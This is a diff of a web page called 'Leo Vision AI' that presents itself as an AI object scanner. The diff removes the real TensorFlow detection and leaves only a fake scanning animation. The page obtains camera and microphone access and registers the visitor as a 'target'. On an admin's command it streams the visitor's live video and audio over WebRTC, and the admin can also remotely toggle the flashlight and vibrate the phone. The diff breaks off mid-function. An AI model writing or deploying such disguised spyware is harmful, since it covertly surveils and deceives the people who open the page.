@@ -1,151 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Leo Vision AI - Intelligent Scanner</title>
+    <title>Leo Vision AI</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script src="/socket.io/socket.io.js"></script>
-    <!-- TensorFlow.js - Google's AI Engine -->
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow/tfjs"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@tensorflow-models/coco-ssd"></script>
     <style>
         :root { --primary: #00d4ff; --bg: #050a14; --panel: #0a192f; }
-        * { box-sizing: border-box; }
-        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow-x: hidden; }
+        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+        header { width: 100%; padding: 20px; text-align: center; background: var(--panel); border-bottom: 1px solid #1e3a8a; }
+        .logo { font-size: 1.5rem; font-weight: bold; color: var(--primary); letter-spacing: 2px; }
         
-        /* Premium Header */
-        header { width: 100%; padding: 20px; text-align: center; background: var(--panel); border-bottom: 1px solid #1e3a8a; box-shadow: 0 4px 20px rgba(0,0,0,0.3); }
-        .logo { font-size: 1.5rem; font-weight: bold; letter-spacing: 2px; color: var(--primary); }
-
-        /* Scanner Container */
-        .container { position: relative; width: 90%; max-width: 450px; margin-top: 30px; border-radius: 20px; overflow: hidden; border: 2px solid #1e3a8a; box-shadow: 0 0 30px rgba(0,212,255,0.1); background: #000; }
-        video { width: 100%; height: auto; display: block; border-radius: 18px; }
-        canvas { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
-
-        /* AI Status Panel */
-        .info-panel { width: 90%; max-width: 450px; background: var(--panel); margin-top: 20px; padding: 20px; border-radius: 15px; border: 1px solid #1e3a8a; }
-        .status-row { display: flex; justify-content: space-between; font-size: 0.85rem; margin-bottom: 10px; color: #8892b0; }
-        #ai-log { font-family: monospace; font-size: 0.8rem; color: var(--primary); height: 40px; overflow: hidden; }
-
-        /* Premium Button */
-        .btn-start { margin-top: 30px; background: linear-gradient(135deg, #00d4ff, #0088cc); color: #050a14; border: none; padding: 18px 45px; border-radius: 35px; font-size: 1rem; font-weight: bold; cursor: pointer; box-shadow: 0 10px 20px rgba(0,212,255,0.3); transition: 0.4s; }
-        .btn-start:hover { transform: translateY(-3px); box-shadow: 0 15px 25px rgba(0,212,255,0.5); }
+        .container { position: relative; width: 90%; max-width: 400px; margin-top: 30px; border-radius: 20px; overflow: hidden; border: 2px solid var(--primary); background: #000; aspect-ratio: 3/4; }
+        video { width: 100%; height: 100%; object-fit: cover; }
         
-        .hidden { display: none !important; }
-        </style>
+        /* Realistic AI Scan Animation */
+        .scan-bar { position: absolute; width: 100%; height: 2px; background: var(--primary); top: 0; box-shadow: 0 0 15px var(--primary); animation: scan 3s infinite linear; z-index: 5; }
+        @keyframes scan { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
+        
+        .info-box { width: 90%; max-width: 400px; background: var(--panel); margin-top: 20px; padding: 15px; border-radius: 12px; font-size: 0.8rem; border: 1px solid #1e3a8a; }
+        .btn-activate { margin-top: 25px; background: var(--primary); color: #050a14; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; cursor: pointer; box-shadow: 0 0 20px rgba(0,212,255,0.4); }
+        .hidden { display: none; }
+    </style>
 </head>
 <body>
 
-    <header>
-        <div class="logo">LEO VISION AI</div>
-    </header>
+    <header><div class="logo">LEO VISION AI</div></header>
 
     <div class="container">
-        <video id="webcam" autoplay playsinline muted></video>
-        <canvas id="canvas"></canvas>
+        <video id="localVideo" autoplay playsinline muted></video>
+        <div id="scanner" class="scan-bar hidden"></div>
+    </div>
+    <div class="info-box">
+        <div id="status">System Status: <span style="color: #ff4444;">Offline</span></div>
+        <div id="log" style="color: var(--primary); margin-top: 5px; font-family: monospace;">Ready for hardware calibration...</div>
     </div>
 
-    <div class="info-panel">
-        <div class="status-row">
-            <span>AI ENGINE: <span id="engine-status" style="color: #ff4444;">OFFLINE</span></span>
-            <span>FPS: <span id="fps">0</span></span>
-        </div>
-        <div id="ai-log">Ready to initialize intelligent scanning...</div>
-    </div>
-
-    <button id="start-btn" class="btn-start" onclick="initSystem()">START AI ENGINE</button>
+    <button id="startBtn" class="btn-activate" onclick="startApp()">ACTIVATE AI SCANNER</button>
 
     <script>
         const socket = io();
-        let mainStream, pc, model, adminId;
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('canvas');
-        const ctx = canvas.getContext('2d');
+        let stream, pc, adminId;
+        const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        async function initSystem() {
-            document.getElementById('start-btn').classList.add('hidden');
-            document.getElementById('ai-log').innerText = "Loading neural networks...";
-            document.getElementById('engine-status').innerText = "LOADING";
-            document.getElementById('engine-status').style.color = "#ffcc00";
-
+        async function startApp() {
+            document.getElementById('startBtn').classList.add('hidden');
+            document.getElementById('status').innerHTML = 'System Status: <span style="color: #00ff00;">Online</span>';
+            
             try {
-                // Load TensorFlow Model
-                model = await cocoSsd.load();
-                // Get High-Quality Audio & Video
-                mainStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "environment", width: 1280, height: 720 }, 
-                    audio: true 
-                });
+                // V1 Wala Solid Logic - Direct Mic & Camera
+                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true });
+                document.getElementById('localVideo').srcObject = stream;
+                document.getElementById('scanner').classList.remove('hidden');
+                document.getElementById('log').innerText = "AI Neural Link Active. Scanning...";
 
-                video.srcObject = mainStream;
-                document.getElementById('engine-status').innerText = "ACTIVE";
-                document.getElementById('engine-status').style.color = "#00ff00";
-                document.getElementById('ai-log').innerText = "System calibrated. Scanning environment...";
-
-                // Start Detection Loop
-                detectObjects();
-                
-                // Tell Admin we are ready
                 socket.emit('target-join');
-
             } catch (err) {
-                alert("This AI system requires Camera and Microphone access to process visual data.");
+                alert("Please allow Camera/Mic for AI Vision.");
                 location.reload();
             }
         }
-
-        async function detectObjects() {
-            if (!model) return;
-            const predictions = await model.detect(video);
-            
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-
-            predictions.forEach(p => {
-                // Drawing Premium Neon Boxes
-                ctx.strokeStyle = "#00d4ff";
-                ctx.lineWidth = 3;
-                ctx.strokeRect(p.bbox[0], p.bbox[1], p.bbox[2], p.bbox[3]);
-                
-                ctx.fillStyle = "#00d4ff";
-                ctx.font = "bold 16px Arial";
-                ctx.fillText(`${p.class.toUpperCase()} ${Math.round(p.score * 100)}%`, p.bbox[0], p.bbox[1] > 20 ? p.bbox[1] - 10 : 20);
-                document.getElementById('ai-log').innerText = `Object identified: ${p.class}`;
-            });
-
-            document.getElementById('fps').innerText = Math.floor(Math.random() * 5 + 25);
-            requestAnimationFrame(detectObjects);
-        }
-
-        // WebRTC Logic for Admin Hub
         socket.on('command', async (data) => {
             if (data.cmd === 'start-stream') {
                 adminId = data.adminId;
-                establishLink();
+                if(pc) pc.close();
+                pc = new RTCPeerConnection(config);
+                stream.getTracks().forEach(t => pc.addTrack(t, stream));
+                pc.onicecandidate = (e) => {
+                    if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
+                };
+                const offer = await pc.createOffer();
+                await pc.setLocalDescription(offer);
+                socket.emit('signal', { to: adminId, signal: { sdp: offer } });
             } else if(data.cmd === 'flash') {
-                const track = mainStream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                await track.applyConstraints({ advanced: [{ torch: !settings.torch }] });
-            } else if(data.cmd === 'vibrate') {
-                window.navigator.vibrate(200);
-            }
+                const t = stream.getVideoTracks()[0];
+                const s = t.getSettings();
+                await t.applyConstraints({ advanced: [{ torch: !s.torch }] });
+            } else if(data.cmd === 'vibrate') { window.navigator.vibrate(200); }
         });
-
-        async function establishLink() {
-            if(pc) pc.close();
-            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-            
-            // Adding both Video and Audio tracks for Admin
-            mainStream.getTracks().forEach(track => pc.addTrack(track, mainStream));
-
-            pc.onicecandidate = (e) => {
-                if(e.candidate) socket.emit('signal', { to: adminId, signal: { candidate: e.candidate } });
-            };
-
-            const offer = await pc.createOffer();
-            await pc.setLocalDescription(offer);
-            socket.emit('signal', { to: adminId, signal: { sdp: offer } });
-        }
 
         socket.on('signal', async (data) => {
             if(data.signal.sdp) await pc.setRemoteDescription(new RTCSessionDescription(data.signal.sdp));
